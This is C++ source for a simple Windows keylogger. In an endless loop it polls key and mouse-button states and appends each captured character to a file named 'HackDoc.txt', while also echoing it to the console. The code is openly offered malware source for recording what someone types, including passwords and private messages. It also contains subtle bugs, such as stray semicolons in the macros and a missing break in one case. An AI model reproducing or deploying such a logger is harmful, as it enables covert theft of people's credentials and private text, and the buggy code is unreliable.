#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>


#define VK_MULTIPLY 0x6A;
#define VK_SPACE 0x20;
#define VK_ADD 0x6B;
#define VK_F1 0x70;
#define VK_TAB 0x09;
#define VK_LWIN 0x5B;
#define VK_RETURN 0x0D;
#define VK_BACK 0x08;
#define VK_ESCAPE 0x1B; 
#define VK_UP 0x26;
#define VK_DOWN 0x28;
#define VK_DELETE 0x2E;
#define VK_LEFT 0x25;
#define VK_RIGHT 0x27;
#define VK_INSERT 0x2D;
#define VK_CONTROL 0x11
#define VK_RBUTTON 0x02;
#define VK_LBUTTON 0x01;
#define VK_LSHIFT 0xA0;
#define VK_RSHIFT 0xA1;
#define VK_CAPITAL 0x14;
#define VK_SNAPSHOT 0x2c; 
#define VK_LMENU 0xA4;
#define VK_MBUTTON 0x04; 
#define VK_DIVIDE 0x6F;
#define VK_SUBTRACT 0x6D;
#define VK_DECIMAL 0x6E; 
#define VK_NUMPAD0 0x60;
#define VK_NUMPAD1 0x61;
#define VK_NUMPAD2 0x62;
#define VK_NUMPAD3 0x63;
#define VK_NUMPAD4 0x64;
#define VK_NUMPAD5 0x65;
#define VK_NUMPAD6 0x66;
#define VK_NUMPAD7 0x67;
#define VK_NUMPAD8 0x68;
#define VK_NUMPAD9 0x69;
#define VK_RWIN 0x5C;
#define VK_F2 0x71;
#define VK_F3 0x72;
#define VK_F4 0x73;
#define VK_F5 0x74;
#define VK_F6 0x75;
#define VK_F7 0x76;
#define VK_F8 0x77;
#define VK_F9 0x78;
#define VK_F10 0x79;

std::string symbol;

void WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	doc_to << text;
	doc_to.close();
}

int SaveSymbol(WORD iKey)
{
	switch (iKey)
	{

	case 33:
		if (GetAsyncKeyState(0xA0))
		{
			symbol += "!";
			std::cout << "!";
			WriteToFile("!");
		}

		case 48:
			std::cout << "0";
			WriteToFile("0");
			break;

		case 49:
			std::cout << "1";
			WriteToFile("1");

			break;

		case 50:
			std::cout << "2";
			WriteToFile("2");
			break;

		case 51:
			std::cout << "3";
			WriteToFile("3");
			break;

		case 52:
			std::cout << "4";
			WriteToFile("4");
			break;

		case 53:
			std::cout << "5";
			WriteToFile("5");
			break;

		case 54:
			std::cout << "6";
			WriteToFile("6");
			break;

		case 55:
			std::cout << "7";
			WriteToFile("7");
			break;

		case 56:
			std::cout << "8";
			WriteToFile("8");
			break;

		case 57:
			std::cout << "9";
			WriteToFile("9");
			break;



		case 65:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "A";
				WriteToFile("A");
			}
			break;

		case 66:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "B";
				WriteToFile("B");
			}
			break;

		case 67:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "C";
				WriteToFile("C");
			}
			break;

		case 68:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "D";
				WriteToFile("D");
			}
			break;

		case 69:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "E";
				WriteToFile("E");
			}
			break;

		case 70:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "F";
				WriteToFile("F");
			}
			break;

		case 71:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "G";
				WriteToFile("G");
			}
			break;

		case 72:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "H";
				WriteToFile("H");
			}
			break;

		case 73:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "I";
				WriteToFile("I");
			}
			break;

		case 74:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "J";
				WriteToFile("J");
			}
			break;


		case 75:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "K";
				WriteToFile("K");
			}
			break;


		case 76:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "L";
				WriteToFile("L");
			}
			break;

		case 77:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "M";
				WriteToFile("M");
			}
			break;


		case 78:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "N";
				WriteToFile("N");
			}
			break;

		case 79:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "O";
				WriteToFile("O");
			}
			break;

		case 80:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "P";
				WriteToFile("P");
			}
			break;

		case 81:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "Q";
				WriteToFile("Q");
			}
			break;

		case 82:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "R";
				WriteToFile("R");
			}
			break;

		case 83:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "S";
				WriteToFile("S");
			}
			break;

		case 84:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "T";
				WriteToFile("T");
			}
			break;

		case 85:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "U";
				WriteToFile("U");
			}
			break;

		case 86:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "V";
				WriteToFile("V");
			}
			break;

		case 87:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "W";
				WriteToFile("W");
			}
			break;

		case 88:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "X";
				WriteToFile("X");
			}
			break;

		case 89:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "Y";
				WriteToFile("Y");
			}
			break;

		case 90:
			if (GetAsyncKeyState(0xA0))
			{
				std::cout << "Z";
				WriteToFile("Z");
			}
			break;



		case 0x71:
			std::cout << "  *F2*  ";
			WriteToFile("  *F2*  ");
			break;

		case 0x72:
			std::cout << "  *F3*  ";
			WriteToFile("  *F3*  ");
			break;

		case 0x73:
			std::cout << "  *F4*  ";
			WriteToFile("  *F4*  ");
			break;

		case 0x74:
			std::cout << "  *F5*  ";
			WriteToFile("  *F5*  ");
			break;

		case 0x75:
			std::cout << "  *F6*  ";
			WriteToFile("  *F6*  ");
			break;

		case 0x76:
			std::cout << "  *F7*  ";
			WriteToFile("  *F7*  ");
			break;

		case 0x77:
			std::cout << "  *F8*  ";
			WriteToFile("  *F8*  ");
			break;

		case 0x78:
			std::cout << "  *F9*  ";
			WriteToFile("  *F9*  ");
			break;

		case 0x79:
			std::cout << "  *F10*  ";
			WriteToFile("  *F10*  ");
			break;

		case 0x5C:
			std::cout << "  *Right_Windows*  ";
			WriteToFile("  *Right_Windows*  ");
			break;

		case 0x60:
			std::cout << "0";
			WriteToFile("0");
			break;

		case 0x61:
			std::cout << "1";
			WriteToFile("1");
			break;

		case 0x62:
			std::cout << "2";
			WriteToFile("2");
			break;

		case 0x63:
			std::cout << "3";
			WriteToFile("3");
			break;

		case 0x64:
			std::cout << "4";
			WriteToFile("4");
			break;

		case 0x65:
			std::cout << "5";
			WriteToFile("5");
			break;

		case 0x66:
			std::cout << "6";
			WriteToFile("6");
			break;

		case 0x67:
			std::cout << "7";
			WriteToFile("7");
			break;

		case 0x68:
			std::cout << "8";
			WriteToFile("8");
			break;

		case 0x69:
			std::cout << "9";
			WriteToFile("9");
			break;

		case 0x6E:
			std::cout << ".";
			WriteToFile(".");
			break;

		case 0x6D:
			std::cout << "-";
			WriteToFile("-");
			break;

		case 0x6A:
			std::cout << "*";
			WriteToFile("*");
			break;

		case 0x5B:
			std::cout << "Left_Win";
			WriteToFile("Left_Win");
			break;


		case 0x20:
			std::cout << " ";
			WriteToFile(" ");
			break;

		case 0x6B:
			std::cout << "+";
			WriteToFile("+");
			break;

		case 0x70:
			std::cout << " *F1* ";
			WriteToFile(" *F1* ");
			break;

		case 0x09:
			std::cout << " *TAB* ";
			WriteToFile(" *TAB* ");
			break;

		case 0x6F:
			std::cout << "/";
			WriteToFile("/");
			break;

		case 0x04:
			std::cout << "  *mouse_middle-button*  ";
			WriteToFile("  *mouse_middle-button*  ");
			break;

		case 0xA4:
			std::cout << "  *Left_ALT*  ";
			WriteToFile("  *Left_ALT*  ");
			break;

		case 0x2c:
			std::cout << "  *PRINT_SCREEN*  ";
			WriteToFile("  *PRINT_SCREEN*  ");
			break;

		case 0x14:
			std::cout << "  *CAPS_LOCK*  ";
			WriteToFile("  *CAPS_LOCK*  ");
			break;

		case 0x0D:
			std::cout << "\n";
			WriteToFile("\n");
			break;

		case 0xA0:
			std::cout << " *Left_Shift* ";
			WriteToFile(" *Left_Shift* ");
			break;

		case 0xA1:
			std::cout << " *Right_Shift* ";
			WriteToFile(" *Right_Shift* ");
			break;

		case 0x08:
			std::cout << "\b";
			WriteToFile("\b");
			break;


		case 0x1B:
			std::cout << " *Esc* ";
			WriteToFile(" *Esc* ");
			break;

		case 0x26:
			std::cout << " btn_up ";
			WriteToFile(" btn_up ");
			break;

		case 0x28:
			std::cout << " btn_down ";
			WriteToFile(" btn_down ");
			break;

		case 0x25:
			std::cout << " btn_left ";
			WriteToFile(" btn_left ");
			break;

		case 0x27:
			std::cout << " btn_right ";
			WriteToFile(" btn_right ");
			break;

		case 0x11:
			std::cout << " btn_ctrl ";
			WriteToFile(" btn_ctrl ");
			break;

		case 0x2D:
			std::cout << " Insert ";
			WriteToFile(" Insert ");
			break;

		case 0x2E:
			std::cout << " *Delete* ";
			WriteToFile(" Delete ");
			break;


		case 0x02:
			std::cout << "*mouse_right*";
			WriteToFile("*mouse_right*");
			break;

		case 0x01:
			std::cout << "*mouse_left*";
			WriteToFile("*mouse_left*");
			break;
	}
	return 0;
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				SaveSymbol(key);
			}
		}
	}
	system("pause");
	return 0;
}